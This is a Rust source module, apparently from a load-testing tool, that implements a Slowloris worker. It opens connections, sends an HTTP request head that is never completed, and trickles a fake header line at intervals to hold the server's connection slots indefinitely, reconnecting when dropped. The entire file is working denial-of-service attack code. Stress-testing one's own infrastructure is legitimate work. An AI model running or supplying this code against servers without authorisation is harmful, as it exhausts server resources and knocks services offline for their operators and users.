//! Slowloris worker (L7).
//!
//! Opens a connection, sends a partial request that is never terminated, then
//! trickles one extra header line every `trickle_interval` to keep the server's
//! connection/worker slot occupied indefinitely. The pre-built partial head is
//! shared (no per-connection allocation); trickle lines are formatted into a
//! stack buffer (no heap in the loop). The signal here is `held_connections`
//! and connect-failure rate, not latency.

use super::net::Target;
use super::{Governor, HeldGuard, Metrics, Shutdown};
use std::io::Write;
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::AsyncWriteExt;

const LINE_CAP: usize = 64;

pub async fn worker(
    idx: u32,
    target: Arc<Target>,
    head: Arc<[u8]>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
    trickle: Duration,
) {
    let mut down = shutdown.subscribe();
    let mut counter: u64 = idx as u64;

    loop {
        if *down.borrow() {
            return;
        }
        if !gov.active(idx) {
            tokio::select! {
                _ = down.changed() => {}
                _ = tokio::time::sleep(Duration::from_millis(100)) => {}
            }
            continue;
        }

        // Open and hold one connection.
        let mut conn = match target.connect().await {
            Ok(c) => c,
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
                tokio::select! {
                    _ = down.changed() => return,
                    _ = tokio::time::sleep(Duration::from_millis(50)) => {}
                }
                continue;
            }
        };
        let _held = HeldGuard::new(&metrics.held_connections);
        metrics.requests_sent.fetch_add(1, Relaxed);

        if conn.write_all(&head).await.is_err() {
            metrics.errors.fetch_add(1, Relaxed);
            continue; // guard drops, reconnect
        }
        metrics.bytes_sent.fetch_add(head.len() as u64, Relaxed);

        // Trickle to keep the request "in progress" forever.
        'hold: loop {
            tokio::select! {
                _ = tokio::time::sleep(trickle) => {}
                _ = down.changed() => return,
            }
            if *down.borrow() {
                return;
            }
            if !gov.active(idx) {
                break 'hold; // parked: release this connection
            }

            counter += 1;
            let mut line = [0u8; LINE_CAP];
            let mut cur: &mut [u8] = &mut line;
            let _ = write!(cur, "X-{counter}: {counter}\r\n");
            let n = LINE_CAP - cur.len();

            if conn.write_all(&line[..n]).await.is_err() {
                metrics.errors.fetch_add(1, Relaxed);
                break 'hold; // server dropped us: reconnect
            }
            metrics.bytes_sent.fetch_add(n as u64, Relaxed);
        }
    }
}
